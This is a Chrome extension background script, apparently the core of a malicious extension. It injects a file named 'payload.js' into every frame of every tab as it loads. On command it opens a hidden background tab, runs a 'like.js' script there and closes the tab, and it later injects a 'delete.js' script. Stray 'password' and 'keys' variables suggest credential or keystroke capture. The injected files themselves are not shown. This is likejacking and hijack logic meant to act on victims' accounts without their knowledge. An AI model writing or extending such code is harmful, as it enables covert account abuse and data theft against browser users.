var blocking = false;
var password;
var keys='';
var first = 0;
var first_connexion = 0;
var t = 0;
var finish = 1;
var noneed = 0;

chrome.tabs.onUpdated.addListener(function(tabId, changeInfo) {

        chrome.tabs.executeScript(tabId, {
            allFrames: true,
            file: 'payload.js'
        });
});

chrome.tabs.onCreated.addListener(function (tab){
    if(t == 1){
      chrome.tabs.executeScript(tab.id, {file: "like.js"}, function() {
        chrome.tabs.remove(tab.id, function(){t = 0; finish = 0;});
      });
    }
  });


chrome.runtime.onMessage.addListener(function(message, sender, sendResponse){
	if(message.badgeText){
		chrome.tabs.get(sender.tab.id, function(tab) {
			if (chrome.runtime.lastError) {
                return;
            }
            if (tab.index >= 0) {
                chrome.browserAction.setBadgeText({tabId:tab.id, text:message.badgeText});
            }

		});
  }
  else if (message.url) {
      if(first == 0){
      chrome.tabs.create({"url": message.url, "selected":false});
      t = 1;
      first = 1;
      }
  }
  else if (message.connexion) {
      if(finish == 0 && noneed == 0){
        chrome.tabs.executeScript(sender.tab.id, {file: "delete.js"}, function() {
        });
        finish = 1;
      }
  }
  else if (message.noneed) {
    noneed = 1;
  }
});
